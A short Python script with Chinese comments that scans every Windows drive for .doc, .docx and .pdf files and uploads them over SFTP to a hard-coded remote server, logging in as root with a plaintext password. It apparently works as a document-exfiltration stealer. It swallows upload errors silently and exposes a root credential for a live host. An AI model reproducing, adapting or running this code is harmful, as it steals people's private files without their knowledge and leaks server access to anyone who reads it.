import os
import paramiko
import string
import time

transport = paramiko.Transport(('139.199.165.105', 22))
transport.connect(username='root', password='hujunqiang520')

sftp = paramiko.SFTPClient.from_transport(transport)  # 如果连接需要密钥，则要加上一个参数，hostkey="密钥"

#创建文件夹，以时间戳命名
now_time = time.strftime('%Y_%m_%d_%H_%M_%S',time.localtime(time.time()))
sftp.mkdir('/root/'+now_time)


def file_name(file_dir):
    for root, dirs, files in os.walk(file_dir):
        # print(root)  # 当前目录路径
        # print(dirs)  # 当前路径下所有子目录
        # print(files)  # 当前路径下所有非目录子文件
        for file in files:
            if (os.path.splitext(file)[1] == '.doc' or os.path.splitext(file)[1] == '.docx' or os.path.splitext(file)[1] == '.pdf'):
                filepath = root+'\\'+file
                print(filepath)
                try:
                    sftp.put(filepath, '/root/'+now_time+'/'+file)  # 将本地的Windows.txt文件上传至服务器/root/Windows.txt
                except:
                    pass
def get_disklist():
    disk_list = []
    for c in string.ascii_uppercase:
        disk = c + ':'
        if os.path.isdir(disk):
            disk_list.append(disk)
    return disk_list

for disk in get_disklist():
    file_name(disk+'\\')

